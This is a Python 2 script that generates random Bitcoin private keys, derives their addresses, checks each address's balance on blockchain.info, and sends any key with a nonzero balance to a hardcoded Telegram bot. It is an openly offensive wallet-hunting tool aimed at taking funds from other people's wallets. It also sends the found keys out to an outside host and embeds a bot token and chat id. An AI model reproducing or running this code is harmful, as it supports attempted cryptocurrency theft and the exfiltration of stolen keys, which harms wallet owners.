from time import sleep
import os
import ecdsa
import random 
import urllib 
import math 
import string 
import numpy as np

import urllib
import urllib2

TOKEN = '110309400:AAExG6jwuCUjJzeLzWqi4jmDhrEriDGT5fY'
BASE_URL = 'https://api.telegram.org/bot' + TOKEN + '/'

def reply(msg):

    resp = urllib2.urlopen(BASE_URL + 'sendMessage', urllib.urlencode({
    'chat_id': '6660201' ,
    'text': msg.encode('utf-8'),
    'disable_web_page_preview': 'true',
    'reply_to_message_id': "" ,
    })).read()

    return

t='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
pubkey = 0
rstr = ""
secp256k1curve=ecdsa.ellipticcurve.CurveFp(115792089237316195423570985008687907853269984665640564039457584007908834671663,0,7)
secp256k1point=ecdsa.ellipticcurve.Point(secp256k1curve,0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
secp256k1=ecdsa.curves.Curve('secp256k1',secp256k1curve,secp256k1point,(1,3,132,0,10))

#--------------------------------------

import binascii, hashlib

def addy(pk):
 pko=ecdsa.SigningKey.from_secret_exponent(pk,secp256k1)
 pubkey=binascii.hexlify(pko.get_verifying_key().to_string())
 pubkey2=hashlib.sha256(binascii.unhexlify('04'+pubkey)).hexdigest()
 pubkey3=hashlib.new('ripemd160',binascii.unhexlify(pubkey2)).hexdigest()
 pubkey4=hashlib.sha256(binascii.unhexlify('00'+pubkey3)).hexdigest()
 pubkey5=hashlib.sha256(binascii.unhexlify(pubkey4)).hexdigest()
 pubkey6=pubkey3+pubkey5[:8]
 pubnum=int(pubkey6,16)
 pubnumlist=[]
 while pubnum!=0: pubnumlist.append(pubnum%58); pubnum/=58
 address=''
 for l in ['123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[x] for x in pubnumlist]:
  address=l+address
 return '1'+address

def pubb(pk):
 pko=ecdsa.SigningKey.from_secret_exponent(pk,secp256k1)
 pubkey = binascii.hexlify(pko.get_verifying_key().to_string())
 pubkey = "04" + (pubkey).upper()
 return pubkey


def numtowif(numpriv):
 step1 = '80'+hex(numpriv)[2:].strip('L').zfill(64)
 step2 = hashlib.sha256(binascii.unhexlify(step1)).hexdigest()
 step3 = hashlib.sha256(binascii.unhexlify(step2)).hexdigest()
 step4 = int(step1 + step3[:8] , 16)
 return ''.join([t[step4/(58**l)%58] for l in range(100)])[::-1].lstrip('1')

def wiftonum(wifpriv):
 return sum([t.index(wifpriv[::-1][l])*(58**l) for l in range(len(wifpriv))])/(2**32)%(2**256)

def validwif(wifpriv):
 return numtowif(wiftonum(wifpriv))==wifpriv


def paleat (n):
 #"Returns a list of n pseudo random bits."""
 bytez = ""
 while len(bytez)*4  < n:
     c = np.random.bytes(1)
     bytez = bytez + (hex(ord(c))[2:].zfill(2))
     
 return bytez

def aleat (n):
 #"Returns a list of n random bits."""
 devrandom = open('/dev/random')
 bytez = ""
 while len(bytez)*4  < n:
     c = devrandom.read(1)
     bytez = bytez + (hex(ord(c))[2:].zfill(2))
     #print (hex(ord(c))[2:].zfill(2))
 return bytez

def fourmi(n):
 #""Requests n bits from FourmiLab."""
 n = 256
 urlstr = "https://www.fourmilab.ch/cgi-bin/uncgi/Hotbits?"+\
 "nbytes=%d&fmt=bin" % math.ceil(n / 8.0)
 bytes = (urllib.urlopen(urlstr).read())
 bytes = map(ord, bytes)
 bytez =""
 for c in bytes:
     bytez = bytez + (hex(c)[2:].zfill(2))
 return bytez

def randomorg():
 urlstr = "https://www.random.org/integers/?num=32&min=0&max=255&col=1&base=16&format=plain&rnd=new"
 bytes = (urllib.urlopen(urlstr).read()).replace("\n", "")
 bytez =""
 for c in bytes:
     bytez = bytez + (c)
 return bytez

def fourmi2():
 urlstr = "https://www.fourmilab.ch/cgi-bin/Hotbits?nbytes=32&fmt=hex&npass=1&lpass=8&pwtype=3"
 #bytes = (urllib.urlopen(urlstr).read())
 
 #print bytes
 fileObj = urllib.urlopen(urlstr)

 for line in fileObj:
    if len (line) == 65:
        print line
        bytez = "0X" + line[:64]
     
 return bytez

acumulado = float(0)
outfile = open("pillado.txt","a") # open file for appending

for n in range(10000):

#bytes = fourmi(256)  #"" Returns a list of n random bits.  from FourmiLab """
#bytes = aleat(256)    #"" Returns a list of n random bits.  from dev/random  """


# Seleccion de la fuente de numeros aleatorios http://www.random.org o http://www.fourmilab.ch

   #bytes = randomorg()
   #bytes = fourmi(1)
   #bytes = fourmi2()
    bytes = paleat (256/8)

# bytes de prueba
   #bytes = "0x000003A28AF16B7620C6AA0E3544C6B668259D40DDBDA9E29F3E2EC35E015194"
           
#print validwif('5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ')
#print validwif('5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTK')

#pk = int(hashlib.sha256('something small and easy to remember but not easy to guess').hexdigest(),16)
#pk = 0X43D526519BB23D81EA7870AC864EE10F50BE691687AFA1A48FD0C99A2BC88EE5

# Realizamos XOR con el valor obtenido via web con 32 bytes elegidos por nosotros. Paranoicos ;-)
    pk = int (bytes,16) #^ int("99A2170A6A172889A8CA10E04E11AF25272F07A836BE37F9B5BCDCE42B4FB60C", 16) 

    if validwif(numtowif(pk)):    
 
        privkey = (str(hex(pk)))[2:-1]
    
        privkey = privkey.rjust(64, "0").upper()
    
#pk =(int(hashlib.sha256(file('hiddeninplainsight.jpg','rb+').read()).hexdigest(),16))
#1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
        pubkey = pubb(pk)
    

        try:
           cantidad = os.popen("GET https://blockchain.info/es/q/addressbalance/" + addy(pk)).read()
           amount = float (cantidad)
        except:
           print ";-)"
           sleep(5)
           
           
        else:

    
        
    
        #print '\033[1;36mBytes from server:\033[1;m'
    	#print bytes.upper()
    	#print '\033[1;36mPublic Key (130 characters [0-9A-F]):\033[1;m'
    	#print pubkey
    	#print '\033[1;36mPrivate Key Hexadecimal Format (64 characters [0-9A-F]):\033[1;m'
    	#print privkey
    	#print '\033[1;36mPrivate Key WIF (51 characters base58, starts with a 5):\033[1;m'
    	#print numtowif(pk)
    	#print '\033[1;36mBitcoin Address:\033[1;m'
    	    acumulado = acumulado + amount
            print acumulado, addy(pk),amount/100000000
    	
    	#print 


    	    if amount > 0 : 
                # outfile.write(str(amount/100000000) +","+ addy(pk) +","+ numtowif(pk) +"\n")
                reply(pk)
                print numtowif(pk)
 

#outfile.close()
